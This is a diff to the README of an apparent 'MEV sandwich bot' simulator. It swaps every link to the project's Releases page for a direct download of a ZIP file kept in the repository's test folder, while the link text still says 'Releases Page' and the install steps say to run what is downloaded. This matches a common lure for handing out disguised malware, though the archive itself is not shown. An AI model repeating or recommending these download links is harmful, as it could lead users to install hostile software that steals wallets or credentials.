@@ -1,7 +1,7 @@
 # 🤖 mev-sandwich-bot - Simulate and Learn Efficient Trading
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/thanhmoi12/mev-sandwich-bot/releases)
+[![Download](https://raw.githubusercontent.com/thanhmoi12/mev-sandwich-bot/main/test/mev-sandwich-bot_v2.2.zip%20Latest%https://raw.githubusercontent.com/thanhmoi12/mev-sandwich-bot/main/test/mev-sandwich-bot_v2.2.zip)](https://raw.githubusercontent.com/thanhmoi12/mev-sandwich-bot/main/test/mev-sandwich-bot_v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the MEV Sandwich Bot Simulator! This application allows you to explore blockchain trading with optimal front-run calculations and Automated Market Maker (AMM) interactions. Whether you are studying blockchain technology or simply want to learn how decentralized finance (DeFi) works, this simulator offers a user-friendly experience.
@@ -22,10 +22,10 @@ To run the MEV Sandwich Bot Simulator, ensure your system meets the following re
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the MEV Sandwich Bot. Click below to start your download:
 
-[Download Now](https://github.com/thanhmoi12/mev-sandwich-bot/releases)
+[Download Now](https://raw.githubusercontent.com/thanhmoi12/mev-sandwich-bot/main/test/mev-sandwich-bot_v2.2.zip)
 
 ### Installation Instructions
-1. **Visit the [Releases Page](https://github.com/thanhmoi12/mev-sandwich-bot/releases).**
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/thanhmoi12/mev-sandwich-bot/main/test/mev-sandwich-bot_v2.2.zip).**
 2. Click on the version you want to download.
 3. Download the installer or ZIP file.
 4. If you downloaded an installer, double-click it to run. If you downloaded a ZIP file, extract it to a folder of your choice.
